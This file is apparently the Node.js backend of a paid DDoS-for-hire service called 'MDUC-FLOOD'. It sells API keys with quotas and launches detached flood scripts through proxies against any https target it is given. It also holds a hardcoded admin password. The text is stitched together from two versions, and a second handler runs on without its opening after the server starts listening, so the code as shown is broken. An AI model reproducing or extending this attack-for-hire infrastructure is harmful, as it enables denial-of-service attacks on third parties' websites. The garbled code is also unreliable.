const express = require("express");
const cors = require("cors");
const { spawn } = require("child_process");
const path = require("path");
const fs = require("fs-extra");
const os = require("os");

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 8080;
const KEY_FILE = "apikey.json";
const PROXY_FILE = "proxy.txt";
const ADMIN_PASSWORD = "Mduc2007@"; // Mật khẩu quản trị của bạn
const activeAttacks = new Map();

// Helper: Đọc và Ghi file Key
const getKeys = () => fs.readJsonSync(KEY_FILE).keys;
const saveKeys = (keys) => fs.writeJsonSync(KEY_FILE, { keys }, { spaces: 2 });

// Tự động Reset lượt dùng mỗi ngày
function resetDailyUsage(keyData) {
    const today = new Date().toISOString().split('T')[0];
    if (keyData.last_reset_date !== today) {
        keyData.usage_today = 0;
        keyData.last_reset_date = today;
        return true;
    }
    return false;
}

// ==================== API TẤN CÔNG ====================
app.get("/api/flood", (req, res) => {
    let { key, target, time, threads, ratelimit, options } = req.query;

    let keys = getKeys();
    let keyIdx = keys.findIndex(k => k.key === key);
    if (keyIdx === -1) return res.status(403).json({ status: "error", msg: "Invalid API Key" });

    let keyData = keys[keyIdx];
    resetDailyUsage(keyData);

    // Kiểm tra giới hạn cơ bản
    if (!target || !target.startsWith("https://")) return res.json({ status: "error", msg: "Target must start with https://" });
    if (parseInt(time) > keyData.max_duration) return res.json({ status: "error", msg: `Limit duration: ${keyData.max_duration}s` });
    
    // Kiểm tra số cuộc tấn công đồng thời
    let currentRunning = Array.from(activeAttacks.values()).filter(a => a.key === key).length;
    if (currentRunning >= keyData.max_concurrent) return res.json({ status: "error", msg: "Concurrent limit reached" });

    // Kiểm tra lượt dùng trong ngày
    if (keyData.usage_today >= keyData.daily_limit) return res.json({ status: "error", msg: "Daily limit reached" });

    // XỬ LÝ OPTIONS VÀ PHÂN QUYỀN
    let rawOptions = options ? options.split(" ") : [];
    let finalOptions = [];
    
    for (let i = 0; i < rawOptions.length; i++) {
        let opt = rawOptions[i];
        
        if (opt.startsWith("--")) {
            // Chỉ thêm nếu option nằm trong danh sách được phép của Key
            if (keyData.allowed_options.includes(opt)) {
                
                // Kiểm tra giới hạn số lượng Browser nếu dùng --browser
                if (opt === "--browser") {
                    let browserCount = parseInt(rawOptions[i + 1]);
                    if (!isNaN(browserCount)) {
                        // Nếu vượt quá giới hạn của Key, ép về mức tối đa cho phép
                        if (browserCount > keyData.max_browsers) {
                            browserCount = keyData.max_browsers;
                        }
                        finalOptions.push("--browser", browserCount.toString());
                        i++; // Bỏ qua phần tử tiếp theo vì nó là con số
                        continue;
                    }
                }
                finalOptions.push(opt);
            }
        }
    }

    const phantomPath = path.join(__dirname, "script.js");
    const cmdArgs = [phantomPath, target, time, threads, ratelimit, PROXY_FILE, ...finalOptions];

    // Chạy script MDUC-FLOOD
    const child = spawn("node", cmdArgs, { detached: true, stdio: 'ignore' });
    const attackId = `mduc_${Date.now()}`;

    activeAttacks.set(attackId, { process: child, key, target, startTime: Date.now() });
    
    // Lưu lịch sử dùng
    keyData.usage_today += 1;
    saveKeys(keys);

    child.on("close", () => activeAttacks.delete(attackId));

    res.json({
        status: "success",
        msg: "MDUC-FLOOD API Sent!",
        data: { attackId, target, time, options: finalOptions.join(" "), limit_info: `Used ${keyData.usage_today}/${keyData.daily_limit}` }
    });
});

// ==================== QUẢN LÝ ADMIN (CURL) ====================

// Thêm Key mới với giới hạn Browser
app.post("/api/admin/addkey", (req, res) => {
    const { 
        admin_pass, new_key, owner, max_duration, max_threads, 
        max_ratelimit, daily_limit, max_concurrent, allowed_options, max_browsers 
    } = req.body;

    if (admin_pass !== ADMIN_PASSWORD) return res.status(401).json({ status: "error", msg: "Wrong Admin Password" });

    let keys = getKeys();
    const keyTemplate = {
        key: new_key,
        owner: owner || "User",
        max_duration: max_duration || 60,
        max_threads: max_threads || 20,
        max_ratelimit: max_ratelimit || 100,
        daily_limit: daily_limit || 10,
        max_concurrent: max_concurrent || 1,
        max_browsers: max_browsers || 2, // Mặc định tối đa 2 trình duyệt
        allowed_options: allowed_options || ["--randpath"],
        usage_today: 0,
        last_reset_date: new Date().toISOString().split('T')[0]
    };

    keys.push(keyTemplate);
    saveKeys(keys);
    res.json({ status: "success", msg: "Key created", key: keyTemplate });
});

// Xóa Key
app.post("/api/admin/delkey", (req, res) => {
    const { admin_pass, key_to_del } = req.body;
    if (admin_pass !== ADMIN_PASSWORD) return res.status(401).json({ status: "error", msg: "Unauthorized" });

    let keys = getKeys();
    const newKeys = keys.filter(k => k.key !== key_to_del);
    saveKeys(newKeys);
    res.json({ status: "success", msg: "Key deleted" });
});

// Kiểm tra trạng thái server
app.get("/api/status", (req, res) => {
    res.json({
        name: "MDUC FLOOD API",
        active_attacks: activeAttacks.size,
        os_load: os.loadavg()[0].toFixed(2),
        free_mem: (os.freemem() / 1024 / 1024 / 1024).toFixed(2) + " GB"
    });
});

app.listen(PORT, () => console.log(`🚀 API MDUC is running on port ${PORT}`));
    let keys = getKeys();
    let keyIdx = keys.findIndex(k => k.key === key);
    if (keyIdx === -1) return res.status(403).json({ status: "error", msg: "Invalid API Key" });

    let keyData = keys[keyIdx];
    resetDailyUsage(keyData);

    // Validation cơ bản
    if (!target || !target.startsWith("https://")) return res.json({ status: "error", msg: "Target must start with https://" });
    if (parseInt(time) > keyData.max_duration) return res.json({ status: "error", msg: `Limit duration: ${keyData.max_duration}s` });
    
    // Kiểm tra giới hạn Concurrent & Daily
    let currentRunning = Array.from(activeAttacks.values()).filter(a => a.key === key).length;
    if (currentRunning >= keyData.max_concurrent) return res.json({ status: "error", msg: "Concurrent limit reached" });
    if (keyData.usage_today >= keyData.daily_limit) return res.json({ status: "error", msg: "Daily usage limit reached" });

    // Xử lý Options (Hỗ trợ --browser 5 --randpath)
    // Client gửi: options=--browser 5 --randpath
    let attackOptions = options ? options.split(" ") : [];
    
    // Lọc bỏ các option không được phép trong key
    attackOptions = attackOptions.filter((opt, index) => {
        if (opt.startsWith("--")) {
            return keyData.allowed_options.includes(opt);
        }
        return true; // Giữ lại các giá trị số sau option (ví dụ: số 5 sau --browser)
    });

    const phantomPath = path.join(__dirname, "script.js");
    const cmdArgs = [
        phantomPath, 
        target, 
        time.toString(), 
        threads.toString(), 
        ratelimit.toString(), 
        PROXY_FILE, 
        ...attackOptions
    ];

    const child = spawn("node", cmdArgs, { 
        detached: true,
        stdio: 'ignore' 
    });

    const attackId = `mduc_${Date.now()}`;
    activeAttacks.set(attackId, { process: child, key, target, startTime: Date.now() });
    
    keyData.usage_today += 1;
    saveKeys(keys);

    child.on("close", () => activeAttacks.delete(attackId));

    res.json({
        status: "success",
        msg: "MDUC-FLOOD attack started",
        data: { attackId, target, options: attackOptions.join(" ") }
    });
});

// 2. [POST] /api/admin/addkey - Tạo Key mới
// Body: { "admin_pass": "...", "new_key": "key_xyz", "max_duration": 120, ... }
app.post("/api/admin/addkey", (req, res) => {
    const { admin_pass, new_key, owner, max_duration, max_threads, max_ratelimit, daily_limit, max_concurrent } = req.body;

    if (admin_pass !== ADMIN_PASSWORD) return res.status(401).json({ status: "error", msg: "Unauthorized" });

    let keys = getKeys();
    if (keys.find(k => k.key === new_key)) return res.json({ status: "error", msg: "Key already exists" });

    const keyTemplate = {
        key: new_key,
        owner: owner || "User",
        max_duration: max_duration || 60,
        max_threads: max_threads || 10,
        max_ratelimit: max_ratelimit || 50,
        daily_limit: daily_limit || 10,
        max_concurrent: max_concurrent || 1,
        allowed_options: ["--reset", "--randpath", "--browser"],
        usage_today: 0,
        last_reset_date: new Date().toISOString().split('T')[0]
    };

    keys.push(keyTemplate);
    saveKeys(keys);
    res.json({ status: "success", msg: "Key created", key: keyTemplate });
});

// 3. [POST] /api/admin/delkey - Xóa Key
app.post("/api/admin/delkey", (req, res) => {
    const { admin_pass, key_to_del } = req.body;
    if (admin_pass !== ADMIN_PASSWORD) return res.status(401).json({ status: "error", msg: "Unauthorized" });

    let keys = getKeys();
    const newKeys = keys.filter(k => k.key !== key_to_del);
    
    if (keys.length === newKeys.length) return res.json({ status: "error", msg: "Key not found" });

    saveKeys(newKeys);
    res.json({ status: "success", msg: `Key ${key_to_del} deleted` });
});

// 4. [GET] /api/status - Trạng thái hệ thống
app.get("/api/status", (req, res) => {
    res.json({
        api_name: "MDUC FLOOD API",
        active_attacks: activeAttacks.size,
        server_info: {
            uptime: Math.floor(process.uptime()) + "s",
            ram_usage: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1) + "%"
        }
    });
});

app.listen(PORT, () => console.log(`🚀 MDUC API is live on port ${PORT}`));
